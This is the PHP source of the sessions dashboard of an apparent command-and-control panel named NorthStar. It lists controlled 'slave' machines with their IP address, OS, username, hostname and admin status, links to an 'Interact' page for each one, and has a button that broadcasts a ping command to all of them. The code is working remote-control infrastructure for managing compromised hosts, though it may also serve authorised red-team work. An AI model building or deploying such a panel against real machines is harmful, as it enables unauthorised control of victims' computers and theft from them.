<?php
include 'session.php';
include 'conn.php';
 ?>
<!DOCTYPE html>
<html lang="en">

<head>

  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <meta name="author" content="">
  <title>NorthStar - Dashboard</title>
  <link href="vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css">
  <link href="css/ruang-admin.min.css" rel="stylesheet">
  <script>

  function reload()
  {
    setTimeout(function(){
      location.reload();
  }, 90000);

  }

  function broadcastPing(){
    broadcasting = true;
    var csrfToken = "<?php echo $_SESSION['token'];?>";
    var xhr = new XMLHttpRequest();
    xhr.open("POST", '/functions/setCommand.nonfunction.php', true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

    xhr.onreadystatechange = function() { // Call a function when the state changes.
        if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
          if(!xhr.responseText.includes("error"))
          {
            document.getElementById("reloadButton").value = " ";
            document.getElementById("reloadButton").disabled = true;
            document.getElementById("reloadButton").className = "spinner-border";
            setTimeout(function(){
              broadcasting = false;
              location.reload();
          }, 14000);
          }
          else
          {
            document.getElementById("reloadErrControl").innerHTML = xhr.responseText;
          }
        }
    }

    xhr.send("slave=broadcast&command=ping&token=" + csrfToken);

  }
function showOnlines(){
var checkbox = document.getElementById('showSwitch');

if(checkbox.checked){
  var elements = document.querySelectorAll("[id='offline']");
  for(var i = 0; i < elements.length; i++)
  elements[i].style.display='none';
}
else{
  var elements = document.querySelectorAll("[id='offline']");
  for(var i = 0; i < elements.length; i++)
  elements[i].style.display='';
}

}
reload();
  </script>
</head>

<body id="page-top">
  <div id="wrapper">
    <!-- Sidebar -->
    <ul class="navbar-nav sidebar sidebar-light">
        <a class="sidebar-brand d-flex align-items-center justify-content-center" href="index.php">

          <div class="sidebar-brand-text mx-3">NorthStar</div>
        </a>
        <hr class="sidebar-divider my-0">
        <li class="nav-item">
          <a class="nav-link" href="index.php">
            <i class="fas fa-fw fa-tachometer-alt"></i>
            <span>Dashboard</span></a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="clients.php">
            <i class="fas fa-fw fa-desktop"></i>
            <span>Sessions</span></a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="logs.php">
            <i class="fas fa-fw fa-history"></i>
            <span>Server Logs</span></a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="user.php">
            <i class="fas fa-fw fa-user"></i>
            <span>User Settings</span></a>
        </li>
        <hr class="sidebar-divider">
        <div class="version" id="version-ruangadmin"></div>
      </ul>

    <!-- Sidebar -->
    <div id="content-wrapper" class="d-flex flex-column">
      <div id="content">
        <!-- TopBar -->
        <div id="content-wrapper" class="d-flex flex-column">
          <div id="content">
            <!-- TopBar -->
            <nav class="navbar navbar-expand navbar-light bg-navbar topbar mb-4 static-top">
              <ul class="navbar-nav ml-auto">
                <li class="nav-item dropdown no-arrow">
                  <a class="nav-link dropdown-toggle" href="/logout.php"  role="button"  aria-expanded="false">
                    <i class="fas fa-sign-out-alt fa-sm fa-fw text-gray-400"></i>
                    <span class="ml-2 d-none d-lg-inline text-white small">Logout</span>
                  </a>

                </li>
              </ul>
            </nav>



        <!-- Container Fluid-->
        <div class="container-fluid" id="container-wrapper">
          <div class="d-sm-flex align-items-center justify-content-between mb-4">
            <h1 class="h3 mb-0 text-gray-800">SESSIONS</h1>


          </div>

<input type="button" id="reloadButton" value="Reload" class="btn btn-sm btn-primary" onclick="broadcastPing();">
<br><p id="reloadErrControl"></p>
<div class="custom-control custom-switch">
  <input type="checkbox" class="custom-control-input" id="showSwitch" onclick="showOnlines();">
  <label class="custom-control-label" for="showSwitch">Show Only Alive Sessions</label>
</div>
          <div class="table-responsive p-3">
            <table class="table align-items-center table-flush" id="dataTable">

              <thead class="thead-light">
                  <tr>
                    <th>ID</th>
                    <th>SlaveID</th>
                    <th>Ip Address</th>
                    <th>Operating System</th>
                    <th>Username</th>
                    <th>Host Name</th>
                    <th>Is Admin</th>
                    <th>Status</th>
                    <th>Action</th>
                  </tr>
                </thead>
                <tbody>


		                <?php
                  $num = 1;
                  $res = $conn->query("SELECT TIMESTAMPDIFF(MINUTE, slaveLatestAction, NOW()) as timestamp, slaveId, slaveLatestAction, slaveIp,slaveUser,slaveDate,slaveStatus,slaveOperatingSystem,slaveWorkingDir, slaveMachineName, slaveIsAdmin from slaves where regCompleted='true' ORDER BY slaveStatus DESC, id DESC");
                  if($res->num_rows > 0)
                  {
                    while($row = $res->fetch_assoc()){
                    $slaveid = $row["slaveId"];
                    $slaveUser = $row["slaveUser"];
		                   $timeDiff = $row["timestamp"];

			                     if($row["slaveStatus"] == "online" && abs($timeDiff) < 120){
                        $status = "<span class='badge badge-success'>Online</span>";
                    echo "<tr name=\"online\">"."<td>". $num . "</td>"."<td>" . htmlspecialchars($row['slaveId']) . "</td>" . "<td>".  htmlspecialchars($row["slaveIp"]) . "</td>" . "<td>" . htmlspecialchars($row["slaveOperatingSystem"]) ."</td>". "<td>" . htmlspecialchars($row["slaveUser"]) ."</td>" . "<td>" . htmlspecialchars($row["slaveMachineName"]) ."</td>"."<td>" . htmlspecialchars($row["slaveIsAdmin"]) ."</td>"."<td>" . $status . "</td>". "<td>"."<a class='btn btn-sm btn-dark'". "href='/interact.php?slave=". htmlspecialchars($slaveid) . "&sid=". htmlspecialchars($slaveid). "' target=\"_blank\">Interact</a>". "</td>" ."</tr>";
                    $num++;
                  }
                  else{
                    $status = "<span class='badge badge-danger'>Offline</span>";
               echo "<tr id=\"offline\">"."<td>". $num . "</td>"."<td>" . htmlspecialchars($row['slaveId']) . "</td>" . "<td>".  htmlspecialchars($row["slaveIp"]) . "</td>" . "<td>" . htmlspecialchars($row["slaveOperatingSystem"]) ."</td>". "<td>" . htmlspecialchars($row["slaveUser"]) ."</td>" . "<td>" . htmlspecialchars($row["slaveMachineName"]) ."</td>"."<td>" . htmlspecialchars($row["slaveIsAdmin"]) ."</td>"."<td>" . $status . "</td>". "<td>"."<a class='btn btn-sm btn-dark'". "href='/interact.php?slave=". htmlspecialchars($slaveid) . "&sid=". htmlspecialchars($slaveid). "' target=\"_blank\">Interact</a>". "</td>" ."</tr>";
                $num++;
              }
                  }
                  }

                   ?>



                </tbody>
              </table>
            </div>

              </div>
            </div>
            </div>
              </div>
            </div>
          </div>
        </div>
        <!---Container Fluid-->
      </div>
      <!-- Footer -->
      <footer class="sticky-footer bg-white">
        <div class="container my-auto">
          <div class="copyright text-center my-auto">
            <span>copyright &copy; <script> document.write(new Date().getFullYear()); </script> - developed by
              <b><a href="https://engindemirbilek.github.io" target="_blank">Engin Demirbilek</a></b>
            </span>
          </div>
        </div>
      </footer>
      <!-- Footer -->
    </div>
  </div>

  <!-- Scroll to top -->
  <a class="scroll-to-top rounded" href="#page-top">
    <i class="fas fa-angle-up"></i>
  </a>
  <script src="vendor/chart.js/Chart.min.js"></script>
</body>

</html>

